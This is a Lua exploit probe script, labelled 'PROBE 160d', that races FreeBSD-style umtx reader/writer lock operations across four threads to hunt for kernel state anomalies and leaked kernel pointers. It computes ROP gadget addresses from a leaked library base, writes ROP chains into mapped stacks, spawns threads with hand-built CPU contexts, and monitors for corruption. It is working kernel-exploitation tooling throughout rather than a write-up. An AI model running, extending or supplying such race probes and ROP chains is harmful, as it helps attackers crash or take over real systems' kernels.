-- CRASH_CLASS: HIGH
-- PROBE 160d: RW lock race — 2 writers + 2 readers contend on urwlock
--
-- rw_state encoding: bit31=WRITE_LOCKED, bits 0-30=reader count
-- Writers: WRLOCK(13)→UNLOCK(14) loop
-- Readers: RDLOCK(12)→UNLOCK(14) loop
-- Reader/writer transitions are historically vulnerable in FreeBSD umtx.

print("=== PROBE 160d: RWLOCK RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(num)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=num
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function hl(v)
    if type(v)=="table" and v.h then return v.h,v.l end
    return 0,N(v)
end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l
        if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end

local umtx=mk(454)
local tc=mk(430)
local tk=mk(433)
local mm=mk(477)
local c624=mk(624)
local stub=syscall.pipe.fn_addr
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local SA=syscall.syscall_address
if not SA then print("NO SA") return end

local inf=memory.alloc(0x200)
wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0
local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
print("gadgets OK")

local _DI=0x048;local _SI=0x050;local _DX=0x058
local _CX=0x060;local _R8=0x068;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110

local STSZ=0x10000  -- 64KB

-- Preflight: test RW lock round trip
print("")
local rwt=memory.alloc(0x40);z(rwt,0x40)
local ok_wr,rv_wr=pcall(function()
    return umtx(uint64(N(rwt)),uint64(13),uint64(0),uint64(0),uint64(0))
end)
print("WRLOCK ret="..(ok_wr and tostring(N(rv_wr)) or "X").." st=0x"..string.format("%X",rd(rwt) or 0))
local ok_wu,rv_wu=pcall(function()
    return umtx(uint64(N(rwt)),uint64(14),uint64(0),uint64(0),uint64(0))
end)
print("UNLOCK ret="..(ok_wu and tostring(N(rv_wu)) or "X").." st=0x"..string.format("%X",rd(rwt) or 0))
if not ok_wr or N(rv_wr)~=0 then print("FAIL") return end

-- Build writer stack: WRLOCK(13)→UNLOCK(14) loop + final UNLOCK + nanosleep
local function bstk_writer(rwaddr)
    local ok_s,stk=pcall(function()
        return mm(uint64(0),uint64(STSZ),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok_s then return nil,0 end

    local np=math.floor((STSZ-96)/80)
    local off=0
    for i=1,np do
        -- UNLOCK(14)
        wq(stk+off,PRSI);off=off+8
        wq(stk+off,uint64(14));off=off+8
        wq(stk+off,PRAX);off=off+8
        wq(stk+off,uint64(454));off=off+8
        wq(stk+off,SA);off=off+8
        -- WRLOCK(13)
        wq(stk+off,PRSI);off=off+8
        wq(stk+off,uint64(13));off=off+8
        wq(stk+off,PRAX);off=off+8
        wq(stk+off,uint64(454));off=off+8
        wq(stk+off,SA);off=off+8
    end
    -- Final UNLOCK
    wq(stk+off,PRSI);off=off+8
    wq(stk+off,uint64(14));off=off+8
    wq(stk+off,PRAX);off=off+8
    wq(stk+off,uint64(454));off=off+8
    wq(stk+off,SA);off=off+8
    -- nanosleep tail
    local ts=memory.alloc(16);wq(ts,uint64(999));wq(ts+8,uint64(0))
    wq(stk+off,PRDI);off=off+8
    wq(stk+off,uint64(N(ts)));off=off+8
    wq(stk+off,PRSI);off=off+8
    wq(stk+off,uint64(0));off=off+8
    wq(stk+off,PRAX);off=off+8
    wq(stk+off,uint64(240));off=off+8
    wq(stk+off,SA);off=off+8
    return stk,np
end

-- Build reader stack: RDLOCK(12)→UNLOCK(14) loop + final UNLOCK + nanosleep
local function bstk_reader(rwaddr)
    local ok_s,stk=pcall(function()
        return mm(uint64(0),uint64(STSZ),uint64(3),
            uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
    end)
    if not ok_s then return nil,0 end

    local np=math.floor((STSZ-96)/80)
    local off=0
    for i=1,np do
        -- UNLOCK(14)
        wq(stk+off,PRSI);off=off+8
        wq(stk+off,uint64(14));off=off+8
        wq(stk+off,PRAX);off=off+8
        wq(stk+off,uint64(454));off=off+8
        wq(stk+off,SA);off=off+8
        -- RDLOCK(12)
        wq(stk+off,PRSI);off=off+8
        wq(stk+off,uint64(12));off=off+8
        wq(stk+off,PRAX);off=off+8
        wq(stk+off,uint64(454));off=off+8
        wq(stk+off,SA);off=off+8
    end
    -- Final UNLOCK
    wq(stk+off,PRSI);off=off+8
    wq(stk+off,uint64(14));off=off+8
    wq(stk+off,PRAX);off=off+8
    wq(stk+off,uint64(454));off=off+8
    wq(stk+off,SA);off=off+8
    -- nanosleep tail
    local ts=memory.alloc(16);wq(ts,uint64(999));wq(ts+8,uint64(0))
    wq(stk+off,PRDI);off=off+8
    wq(stk+off,uint64(N(ts)));off=off+8
    wq(stk+off,PRSI);off=off+8
    wq(stk+off,uint64(0));off=off+8
    wq(stk+off,PRAX);off=off+8
    wq(stk+off,uint64(240));off=off+8
    wq(stk+off,SA);off=off+8
    return stk,np
end

local function spwn(stk,rwaddr,op)
    local ctx=memory.alloc(0x200);z(ctx,0x200)
    wq(ctx+_MG,uint64(0x480));wd(ctx+_FL,0)
    wq(ctx+_TP,uint64(0x10000))
    wq(ctx+_CS,uint64(0x43));wq(ctx+_SS,uint64(0x3B))
    wq(ctx+_IP,SA);wq(ctx+_SP,uint64(N(stk)))
    wq(ctx+_AX,uint64(454))
    wq(ctx+_DI,uint64(N(rwaddr)))
    wq(ctx+_SI,uint64(op))
    wq(ctx+_DX,uint64(0));wq(ctx+_CX,uint64(0));wq(ctx+_R8,uint64(0))
    local tb=memory.alloc(8);wq(tb,uint64(0))
    local ok_t,rv_t=pcall(function() return tc(uint64(ctx),uint64(tb),uint64(0)) end)
    return ok_t,rv_t,rq(tb)
end

local function alive(tid)
    if not tid or N(tid)==0 then return false end
    local ok,rv=pcall(function() return tk(tid,uint64(0)) end)
    return ok and N(rv)==0
end

local function nsl(ms)
    local ts=memory.alloc(16)
    wq(ts,uint64(math.floor(ms/1000)))
    wq(ts+8,uint64((ms%1000)*1000000))
    pcall(function() mk(240)(uint64(ts),uint64(0)) end)
end

local function vmc()
    local ok,c=pcall(function() return c624(uint64(0),uint64(0),uint64(0)) end)
    return ok and N(c) or -1
end

-- ============================================================
print("")
print("--- RWLOCK RACE ---")
local rwl=memory.alloc(0x80);z(rwl,0x80)

local vm0=vmc()
print("vm0="..vm0)

print("[1] building stacks: 2 writers + 2 readers...")
local sw1,np=bstk_writer(rwl)
if not sw1 then print("sw1 FAIL") return end
local sw2=bstk_writer(rwl)
if not sw2 then print("sw2 FAIL") return end
local sr1=bstk_reader(rwl)
if not sr1 then print("sr1 FAIL") return end
local sr2=bstk_reader(rwl)
if not sr2 then print("sr2 FAIL") return end
print("  "..np.." pairs each, 4 threads")

print("[2] spawning...")
local tids={}
-- Writers start with WRLOCK(13), initial syscall
local ok1,rv1,tid1=spwn(sw1,rwl,13)
tids[1]=tid1; print("  W1 rv="..(ok1 and tostring(N(rv1)) or "X").." tid="..q(tid1))
nsl(2)
local ok2,rv2,tid2=spwn(sw2,rwl,13)
tids[2]=tid2; print("  W2 rv="..(ok2 and tostring(N(rv2)) or "X").." tid="..q(tid2))
nsl(2)
-- Readers start with RDLOCK(12)
local ok3,rv3,tid3=spwn(sr1,rwl,12)
tids[3]=tid3; print("  R1 rv="..(ok3 and tostring(N(rv3)) or "X").." tid="..q(tid3))
nsl(2)
local ok4,rv4,tid4=spwn(sr2,rwl,12)
tids[4]=tid4; print("  R2 rv="..(ok4 and tostring(N(rv4)) or "X").." tid="..q(tid4))
nsl(10)

local alv=""
for i=1,4 do alv=alv..(alive(tids[i]) and "Y" or "N") end
print("  alive="..alv)

print("[3] monitoring 300 samples...")
local anom=0
local wlocked=0
local rlocked=0

for i=1,300 do
    nsl(5)

    local st=rd(rwl) or 0

    -- Decode rw_state
    local wbit=(st>=0x80000000)
    local rcnt=st
    if wbit then rcnt=st-0x80000000 end

    if wbit then wlocked=wlocked+1 end
    if rcnt>0 and not wbit then rlocked=rlocked+1 end

    -- Anomaly: write-locked AND reader count > 0 simultaneously
    if wbit and rcnt>0 then
        anom=anom+1
        if anom<=10 then
            print(string.format("  *** ANOM #%d s%d: rw_state=0x%08X (W+R=%d)",anom,i,st,rcnt))
        end
    end

    -- Anomaly: reader count > 4 (only 2 readers)
    if not wbit and rcnt>4 then
        anom=anom+1
        if anom<=10 then
            print(string.format("  *** ANOM #%d s%d: rw_state=0x%08X (rcnt=%d>4!)",anom,i,st,rcnt))
        end
    end

    if i%100==0 then
        local kp=0
        for o=0,0x70,8 do
            local v=rq(rwl+o)
            if v then
                local vh=hl(v)
                if vh<0 then vh=vh+0x100000000 end
                if vh>=0xFFFF8000 and vh~=0xFFFFFFFF then
                    kp=kp+1
                    print(string.format("  KPTR +0x%02X: %s",o,q(v)))
                end
            end
        end
        local alv2=""
        for j=1,4 do alv2=alv2..(alive(tids[j]) and "Y" or "N") end
        local vm=vmc()
        print(string.format("  s%d st=0x%X vm=%d a=%s kp=%d anom=%d w=%d r=%d",
            i,st,vm,alv2,kp,anom,wlocked,rlocked))
    end
end

local vm1=vmc()
print("[4] vm: "..vm0.."->"..vm1.." d="..(vm1-vm0))
print("  anom="..anom.." wlocked="..wlocked.." rlocked="..rlocked)
print("[5] final rwlock:")
for o=0,0x20,4 do
    local v=rd(rwl+o) or 0
    if v~=0 or o==0 then print(string.format("  +0x%02X: 0x%08X",o,v)) end
end
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 160d COMPLETE ===")
